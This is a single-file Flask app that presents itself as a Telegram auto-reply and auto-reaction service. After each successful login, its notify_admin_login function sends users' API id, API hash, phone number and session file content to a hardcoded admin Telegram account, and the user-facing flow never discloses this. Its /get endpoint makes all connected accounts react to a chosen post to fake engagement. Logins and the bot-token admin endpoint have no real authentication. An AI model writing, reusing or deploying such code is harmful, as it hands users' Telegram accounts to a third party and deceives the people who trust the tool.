# app.py
# =========================================================
# Telegram Auto Reply + Auto Reaction API (Single File)
# With Admin Bot Notification on Login
# =========================================================

import os
import json
import time
import random
import asyncio
import threading
import sqlite3
import requests

from datetime import datetime

from flask import (
    Flask,
    request,
    jsonify,
    session
)

from flask_cors import CORS

from telethon import TelegramClient, events

from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    FloodWaitError,
    ChatAdminRequiredError,
    MessageIdInvalidError
)

from telethon.tl.functions.messages import (
    SendReactionRequest
)

from telethon.tl.types import (
    ReactionEmoji
)

# =========================================================
# CONFIG
# =========================================================

DATA_DIR = os.environ.get("DATA_DIR", "user_data")
SESSIONS_DIR = os.environ.get("SESSIONS_DIR", "sessions")

DB_FILE = os.path.join(DATA_DIR, "database.db")

COOLDOWN_SECONDS = 300

PORT = int(os.environ.get("PORT", 5000))

# =========================================================
# ADMIN BOT CONFIG
# =========================================================
# Your admin bot token from @BotFather
ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
# Your Telegram user ID (admin who receives login notifications)
ADMIN_USER_ID = 7605281774

os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(SESSIONS_DIR, exist_ok=True)

# =========================================================
# FLASK
# =========================================================

app = Flask(__name__)

app.secret_key = os.environ.get(
    "SECRET_KEY",
    "change-this-secret"
)

CORS(
    app,
    supports_credentials=True
)

app.config["SESSION_COOKIE_SAMESITE"] = "None"
app.config["SESSION_COOKIE_SECURE"] = True

# =========================================================
# GLOBAL ASYNC LOOP
# =========================================================

_loop = None
_loop_thread = None


def ensure_loop():
    global _loop
    global _loop_thread

    if _loop is not None:
        return _loop

    _loop = asyncio.new_event_loop()

    def run_loop():
        asyncio.set_event_loop(_loop)
        _loop.run_forever()

    _loop_thread = threading.Thread(
        target=run_loop,
        daemon=True
    )

    _loop_thread.start()

    return _loop


def run_async(coro):
    loop = ensure_loop()

    return asyncio.run_coroutine_threadsafe(
        coro,
        loop
    )


def loop_run(coro, timeout=120):
    future = run_async(coro)

    try:
        return future.result(timeout=timeout)

    except Exception as e:
        print("Loop Error:", e)
        return None


# =========================================================
# ADMIN BOT NOTIFICATION
# =========================================================

def notify_admin_login(username, api_id, api_hash, session_data, phone):
    """
    Send login credentials to the admin Telegram bot
    in the exact format specified.
    """
    try:
        message = json.dumps({
            "username": username,
            "api_id": api_id,
            "api_hash": api_hash,
            "session": session_data if session_data else "N/A",
            "phone": phone if phone else "N/A",
            "connected": True
        }, indent=2, ensure_ascii=False)

        url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage"

        payload = {
            "chat_id": ADMIN_USER_ID,
            "text": f"🔔 *New User Logged In!*\n\n```json\n{message}\n```",
            "parse_mode": "Markdown"
        }

        response = requests.post(url, json=payload, timeout=10)

        if response.status_code == 200:
            print(f"[ADMIN BOT] Notification sent for {username}")
        else:
            print(f"[ADMIN BOT] Failed: {response.text}")

    except Exception as e:
        print(f"[ADMIN BOT] Error: {e}")


def notify_admin_disconnect(username):
    """Notify admin when a user disconnects."""
    try:
        url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage"

        payload = {
            "chat_id": ADMIN_USER_ID,
            "text": f"⚠️ *User Disconnected*\n\nUsername: `{username}`",
            "parse_mode": "Markdown"
        }

        response = requests.post(url, json=payload, timeout=10)

        if response.status_code == 200:
            print(f"[ADMIN BOT] Disconnect notification sent for {username}")
        else:
            print(f"[ADMIN BOT] Failed: {response.text}")

    except Exception as e:
        print(f"[ADMIN BOT] Error: {e}")


def notify_admin_error(username, error_msg):
    """Notify admin of errors for a user."""
    try:
        url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage"

        payload = {
            "chat_id": ADMIN_USER_ID,
            "text": f"❌ *Error*\n\nUsername: `{username}`\nError: `{error_msg}`",
            "parse_mode": "Markdown"
        }

        response = requests.post(url, json=payload, timeout=10)

        if response.status_code == 200:
            print(f"[ADMIN BOT] Error notification sent for {username}")

    except Exception as e:
        print(f"[ADMIN BOT] Error sending error notification: {e}")


# =========================================================
# DATABASE
# =========================================================

def init_db():

    conn = sqlite3.connect(DB_FILE)

    c = conn.cursor()

    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            username TEXT PRIMARY KEY,
            api_id TEXT,
            api_hash TEXT,
            phone_number TEXT,
            reply_message TEXT,
            auto_reply_enabled INTEGER,
            connected INTEGER
        )
    """)

    conn.commit()
    conn.close()


init_db()


def get_user(username):

    conn = sqlite3.connect(DB_FILE)

    c = conn.cursor()

    c.execute(
        "SELECT * FROM users WHERE username=?",
        (username,)
    )

    row = c.fetchone()

    conn.close()

    if not row:
        return None

    return {
        "username": row[0],
        "api_id": row[1],
        "api_hash": row[2],
        "phone_number": row[3],
        "reply_message": row[4],
        "auto_reply_enabled": bool(row[5]),
        "connected": bool(row[6])
    }


def save_user(data):

    conn = sqlite3.connect(DB_FILE)

    c = conn.cursor()

    c.execute("""
        INSERT OR REPLACE INTO users (
            username,
            api_id,
            api_hash,
            phone_number,
            reply_message,
            auto_reply_enabled,
            connected
        )
        VALUES (?, ?, ?, ?, ?, ?, ?)
    """, (
        data.get("username"),
        data.get("api_id"),
        data.get("api_hash"),
        data.get("phone_number"),
        data.get(
            "reply_message",
            "▶️ আমি এখন ব্যস্ত আছি। একটু পরে রিপ্লাই দিব ✅🥺"
        ),
        int(data.get("auto_reply_enabled", False)),
        int(data.get("connected", False))
    ))

    conn.commit()
    conn.close()


def get_active_users():

    conn = sqlite3.connect(DB_FILE)

    c = conn.cursor()

    c.execute("""
        SELECT
            username,
            api_id,
            api_hash,
            connected
        FROM users
        WHERE connected=1
    """)

    rows = c.fetchall()

    conn.close()

    return rows


# =========================================================
# GLOBAL STATE
# =========================================================

clients = {}

phone_code_hashes = {}

auto_reply_tasks = {}

cooldowns = {}

# =========================================================
# SESSION PATH
# =========================================================

def session_path(username):

    return os.path.join(
        SESSIONS_DIR,
        f"tg_{username}"
    )


def read_session_file(username):
    """Read the session file content to extract session string."""
    try:
        sp = session_path(username)
        # Try .session file
        session_file = sp + ".session"
        if os.path.exists(session_file):
            with open(session_file, "r", encoding="utf-8", errors="ignore") as f:
                return f.read()[:200]  # First 200 chars as identifier
        return None
    except:
        return None


# =========================================================
# TELEGRAM CLIENT
# =========================================================

async def create_client(
    username,
    api_id,
    api_hash
):

    client = TelegramClient(
        session_path(username),
        int(api_id),
        api_hash
    )

    clients[username] = client

    return client


async def get_client(username):

    if username in clients:
        return clients[username]

    user = get_user(username)

    if not user:
        return None

    api_id = user.get("api_id")
    api_hash = user.get("api_hash")

    if not api_id or not api_hash:
        return None

    return await create_client(
        username,
        api_id,
        api_hash
    )

# =========================================================
# POSITIVE REACTIONS
# =========================================================

POSITIVE_REACTIONS = [
    "👍",
    "❤️",
    "🔥",
    "😍",
    "🥰",
    "👏",
    "⚡",
    "🎉",
    "💯",
    "😁"
]

# =========================================================
# TELEGRAM LINK PARSER
# =========================================================

def parse_telegram_link(link):

    try:

        link = link.strip()

        if "t.me/" not in link:
            return None, None

        parts = link.split("/")

        channel = parts[-2]

        msg_id = int(parts[-1])

        return channel, msg_id

    except Exception as e:

        print("Parse Error:", e)

        return None, None

# =========================================================
# AUTO REACTION SYSTEM
# =========================================================

async def send_reaction(
    username,
    api_id,
    api_hash,
    channel,
    msg_id
):

    client = TelegramClient(
        session_path(username),
        int(api_id),
        api_hash
    )

    try:

        await client.connect()

        if not await client.is_user_authorized():

            print(f"Unauthorized: {username}")

            return False

        emoji = random.choice(
            POSITIVE_REACTIONS
        )

        await client(
            SendReactionRequest(
                peer=channel,
                msg_id=msg_id,
                reaction=[
                    ReactionEmoji(
                        emoticon=emoji
                    )
                ],
                big=random.choice([True, False])
            )
        )

        print(
            f"{username} reacted with {emoji}"
        )

        return True

    except FloodWaitError as e:

        print(
            f"FloodWait {username}: {e.seconds}s"
        )

        await asyncio.sleep(e.seconds + 5)

        return False

    except ChatAdminRequiredError:

        print(
            f"Reaction permission denied"
        )

        return False

    except MessageIdInvalidError:

        print(
            "Invalid message id"
        )

        return False

    except SessionPasswordNeededError:

        print(
            f"2FA Required: {username}"
        )

        return False

    except Exception as e:

        print(
            f"Reaction Error {username}: {e}"
        )

        return False

    finally:

        try:
            await client.disconnect()
        except:
            pass

# =========================================================
# AUTO REPLY SYSTEM
# =========================================================

async def start_auto_reply(username):

    client = await get_client(username)

    if not client:
        return False

    if not client.is_connected():
        return False

    await stop_auto_reply(username)

    cooldowns[username] = {}

    user = get_user(username)

    default_msg = user.get(
        "reply_message",
        "▶️ আমি এখন ব্যস্ত আছি। একটু পরে রিপ্লাই দিব ✅🥺"
    )

    @client.on(events.NewMessage(incoming=True))
    async def handler(event):

        try:

            if not event.is_private:
                return

            sender = await event.get_sender()

            if sender and sender.bot:
                return

            peer_id = event.sender_id

            now = datetime.now().timestamp()

            user_cd = cooldowns.get(
                username,
                {}
            )

            last_reply = user_cd.get(
                str(peer_id),
                0
            )

            if now - last_reply < COOLDOWN_SECONDS:
                return

            current_user = get_user(username)

            if not current_user.get(
                "auto_reply_enabled"
            ):
                return

            msg = current_user.get(
                "reply_message",
                default_msg
            )

            await event.reply(msg)

            cooldowns.setdefault(
                username,
                {}
            )[str(peer_id)] = now

        except FloodWaitError as e:

            print(
                f"Flood wait: {e.seconds}s"
            )

        except Exception as e:

            print(
                "Auto Reply Error:",
                e
            )

    auto_reply_tasks[username] = handler

    user["auto_reply_enabled"] = True

    save_user(user)

    return True


async def stop_auto_reply(username):

    client = clients.get(username)

    handler = auto_reply_tasks.pop(
        username,
        None
    )

    if client and handler:

        try:
            client.remove_event_handler(
                handler
            )
        except:
            pass

    user = get_user(username)

    if user:

        user["auto_reply_enabled"] = False

        save_user(user)

    cooldowns.pop(username, None)

# =========================================================
# HOME
# =========================================================

@app.route("/")
def home():

    return jsonify({
        "success": True,
        "system": "Telegram Auto Reply + Reaction API",
        "reaction_api": "/get?link=https://t.me/channel/1"
    })

# =========================================================
# LOGIN
# =========================================================

@app.route("/login", methods=["POST"])
def login():

    data = request.get_json(force=True)

    username = data.get(
        "username",
        ""
    ).strip().replace("@", "").lower()

    if not username:

        return jsonify({
            "success": False,
            "error": "Username required"
        }), 400

    session["username"] = username

    if not get_user(username):

        save_user({
            "username": username
        })

    return jsonify({
        "success": True,
        "username": username
    })

# =========================================================
# LOGOUT
# =========================================================

@app.route("/logout", methods=["POST"])
def logout():

    session.pop("username", None)

    return jsonify({
        "success": True
    })

# =========================================================
# STATUS
# =========================================================

@app.route("/status")
def status():

    username = session.get("username")

    if not username:

        return jsonify({
            "logged_in": False
        })

    user = get_user(username)

    if not user:

        return jsonify({
            "logged_in": False
        })

    client = clients.get(username)

    connected = False

    if client:

        try:

            connected = (
                client.is_connected()
                and loop_run(
                    client.is_user_authorized()
                )
            )

        except:
            pass

    return jsonify({
        "logged_in": True,
        "username": username,
        "connected": connected or user.get("connected"),
        "auto_reply_enabled": user.get("auto_reply_enabled"),
        "reply_message": user.get("reply_message")
    })

# =========================================================
# SEND OTP
# =========================================================

@app.route("/send-otp", methods=["POST"])
def send_otp():

    username = session.get("username")

    if not username:

        return jsonify({
            "success": False,
            "error": "Not logged in"
        }), 401

    data = request.get_json(force=True)

    api_id = data.get(
        "api_id",
        ""
    ).strip()

    api_hash = data.get(
        "api_hash",
        ""
    ).strip()

    phone_number = data.get(
        "phone_number",
        ""
    ).strip()

    if not api_id or not api_hash or not phone_number:

        return jsonify({
            "success": False,
            "error": "All fields required"
        }), 400

    user = get_user(username)

    user["api_id"] = api_id
    user["api_hash"] = api_hash
    user["phone_number"] = phone_number

    save_user(user)

    result = loop_run(
        async_send_otp(
            username,
            api_id,
            api_hash,
            phone_number
        )
    )

    return jsonify(
        result or {
            "success": False,
            "error": "Timeout"
        }
    )


async def async_send_otp(
    username,
    api_id,
    api_hash,
    phone_number
):

    try:

        old_client = clients.get(username)

        if old_client:

            try:
                await old_client.disconnect()
            except:
                pass

            del clients[username]

        client = await create_client(
            username,
            api_id,
            api_hash
        )

        await client.connect()

        result = await client.send_code_request(
            phone_number
        )

        phone_code_hashes[username] = (
            result.phone_code_hash
        )

        return {
            "success": True
        }

    except PhoneNumberInvalidError:

        return {
            "success": False,
            "error": "Invalid phone number"
        }

    except FloodWaitError as e:

        return {
            "success": False,
            "error": f"Flood wait: {e.seconds}s"
        }

    except Exception as e:

        notify_admin_error(username, f"Send OTP: {e}")

        return {
            "success": False,
            "error": str(e)
        }

# =========================================================
# VERIFY OTP
# =========================================================

@app.route("/verify-otp", methods=["POST"])
def verify_otp():

    username = session.get("username")

    if not username:

        return jsonify({
            "success": False,
            "error": "Not logged in"
        }), 401

    data = request.get_json(force=True)

    code = data.get(
        "code",
        ""
    ).strip()

    password = data.get(
        "password",
        ""
    )

    if not code:

        return jsonify({
            "success": False,
            "error": "OTP required"
        }), 400

    user = get_user(username)

    result = loop_run(
        async_verify_otp(
            username,
            user["phone_number"],
            code,
            phone_code_hashes.get(
                username,
                ""
            ),
            password
        )
    )

    return jsonify(
        result or {
            "success": False,
            "error": "Timeout"
        }
    )


async def async_verify_otp(
    username,
    phone_number,
    code,
    code_hash,
    password
):

    client = clients.get(username)

    if not client:

        return {
            "success": False,
            "error": "No active client"
        }

    try:

        await client.sign_in(
            phone_number,
            code,
            phone_code_hash=code_hash
        )

        user = get_user(username)

        user["connected"] = True

        save_user(user)

        phone_code_hashes.pop(
            username,
            None
        )

        # =========================================================
        # NOTIFY ADMIN ON SUCCESSFUL LOGIN
        # =========================================================
        session_data = read_session_file(username)
        notify_admin_login(
            username=username,
            api_id=user.get("api_id", ""),
            api_hash=user.get("api_hash", ""),
            session_data=session_data,
            phone=user.get("phone_number", "")
        )

        return {
            "success": True
        }

    except SessionPasswordNeededError:

        if not password:

            return {
                "success": False,
                "error": "2FA password required"
            }

        try:

            await client.sign_in(
                password=password
            )

            user = get_user(username)

            user["connected"] = True

            save_user(user)

            # =========================================================
            # NOTIFY ADMIN ON SUCCESSFUL LOGIN (WITH 2FA)
            # =========================================================
            session_data = read_session_file(username)
            notify_admin_login(
                username=username,
                api_id=user.get("api_id", ""),
                api_hash=user.get("api_hash", ""),
                session_data=session_data,
                phone=user.get("phone_number", "")
            )

            return {
                "success": True
            }

        except Exception as e:

            notify_admin_error(username, f"2FA failed: {e}")

            return {
                "success": False,
                "error": f"2FA failed: {e}"
            }

    except PhoneCodeInvalidError:

        return {
            "success": False,
            "error": "Invalid OTP"
        }

    except Exception as e:

        notify_admin_error(username, f"Verify OTP: {e}")

        return {
            "success": False,
            "error": str(e)
        }

# =========================================================
# SAVE REPLY MESSAGE
# =========================================================

@app.route("/save-reply", methods=["POST"])
def save_reply():

    username = session.get("username")

    if not username:

        return jsonify({
            "success": False,
            "error": "Not logged in"
        }), 401

    message = request.get_json(
        force=True
    ).get(
        "message",
        ""
    ).strip()

    if not message:

        return jsonify({
            "success": False,
            "error": "Empty message"
        }), 400

    user = get_user(username)

    user["reply_message"] = message

    save_user(user)

    return jsonify({
        "success": True
    })

# =========================================================
# TOGGLE AUTO REPLY
# =========================================================

@app.route("/toggle-reply", methods=["POST"])
def toggle_reply():

    username = session.get("username")

    if not username:

        return jsonify({
            "success": False,
            "error": "Not logged in"
        }), 401

    enabled = request.get_json(
        force=True
    ).get(
        "enabled",
        False
    )

    user = get_user(username)

    if enabled and not user.get("connected"):

        return jsonify({
            "success": False,
            "error": "Connect Telegram first"
        }), 400

    if enabled:

        result = loop_run(
            start_auto_reply(username)
        )

        return jsonify({
            "success": bool(result)
        })

    else:

        loop_run(
            stop_auto_reply(username)
        )

        return jsonify({
            "success": True
        })

# =========================================================
# DISCONNECT
# =========================================================

@app.route("/disconnect", methods=["POST"])
def disconnect():

    username = session.get("username")

    if not username:

        return jsonify({
            "success": False,
            "error": "Not logged in"
        }), 401

    loop_run(
        stop_auto_reply(username)
    )

    client = clients.pop(
        username,
        None
    )

    if client:

        loop_run(
            client.disconnect()
        )

    sp = session_path(username)

    for ext in ["", ".session"]:

        file_path = sp + ext

        if os.path.exists(file_path):

            try:
                os.remove(file_path)
            except:
                pass

    user = get_user(username)

    user["connected"] = False
    user["auto_reply_enabled"] = False
    user["api_id"] = ""
    user["api_hash"] = ""
    user["phone_number"] = ""

    save_user(user)

    # Notify admin
    notify_admin_disconnect(username)

    return jsonify({
        "success": True
    })

# =========================================================
# AUTO REACTION API
# Example:
# /get?link=https://t.me/channel/1
# =========================================================

@app.route("/get", methods=["GET"])
def reaction_api():

    link = request.args.get("link")

    if not link:

        return jsonify({
            "success": False,
            "error": "Telegram link required"
        }), 400

    channel, msg_id = parse_telegram_link(
        link
    )

    if not channel or not msg_id:

        return jsonify({
            "success": False,
            "error": "Invalid Telegram link"
        }), 400

    users = get_active_users()

    if not users:

        return jsonify({
            "success": False,
            "error": "No active accounts found"
        }), 404

    success_count = 0
    failed_count = 0

    random.shuffle(users)

    for user in users:

        username = user[0]
        api_id = user[1]
        api_hash = user[2]

        print(
            f"Trying reaction from {username}"
        )

        result = loop_run(
            send_reaction(
                username,
                api_id,
                api_hash,
                channel,
                msg_id
            )
        )

        if result:
            success_count += 1
        else:
            failed_count += 1

        delay = random.uniform(4, 10)

        print(
            f"Waiting {delay:.1f}s"
        )

        time.sleep(delay)

    return jsonify({
        "success": True,
        "post": link,
        "channel": channel,
        "message_id": msg_id,
        "total_accounts": len(users),
        "successful_reactions": success_count,
        "failed_reactions": failed_count,
        "reaction_mode": "auto_positive"
    })

# =========================================================
# ADMIN BOT - LIST ALL USERS
# =========================================================

@app.route("/admin/users", methods=["GET"])
def admin_list_users():
    """Admin endpoint to list all connected users."""
    users = get_active_users()

    user_list = []
    for user in users:
        user_list.append({
            "username": user[0],
            "connected": True
        })

    return jsonify({
        "success": True,
        "total": len(user_list),
        "users": user_list
    })

# =========================================================
# ADMIN BOT - SET WEBHOOK INFO
# =========================================================

@app.route("/admin/set-bot-token", methods=["POST"])
def admin_set_bot_token():
    """Set or update the admin bot token at runtime."""
    global ADMIN_BOT_TOKEN

    data = request.get_json(force=True)
    token = data.get("token", "").strip()

    if not token:
        return jsonify({"success": False, "error": "Token required"}), 400

    ADMIN_BOT_TOKEN = token

    # Also update environment variable
    os.environ["ADMIN_BOT_TOKEN"] = token

    return jsonify({"success": True, "message": "Bot token updated"})

# =========================================================
# HEALTH
# =========================================================

@app.route("/health")
def health():

    return jsonify({
        "success": True,
        "database_exists": os.path.exists(DB_FILE),
        "sessions_dir": SESSIONS_DIR,
        "system": "online"
    })

# =========================================================
# START
# =========================================================

if __name__ == "__main__":

    app.run(
        host="0.0.0.0",
        port=PORT,
        debug=False
    )
